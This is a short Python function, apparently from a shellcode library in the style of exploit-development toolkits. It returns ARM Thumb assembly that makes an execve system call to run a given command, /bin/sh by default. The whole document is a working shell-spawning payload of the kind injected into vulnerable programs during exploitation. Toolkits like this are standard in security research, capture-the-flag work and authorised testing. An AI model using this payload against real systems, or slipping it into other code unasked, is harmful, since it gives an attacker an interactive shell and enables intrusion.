def generate(cmd='/bin/sh'):
    """Executes cmd

    Args:
        cmd(str): executes cmd (default: ``/bin/sh``)
    """
    sc = """
    mov  r0, pc
    adds r0, #11
    adds r0, r0, #1
    subs r2, r2, r2
    movs r7, #11
    push {r0, r2}
    mov  r1, sp
    svc  1
    .asciz "%s"
    """ % (cmd)
    return sc
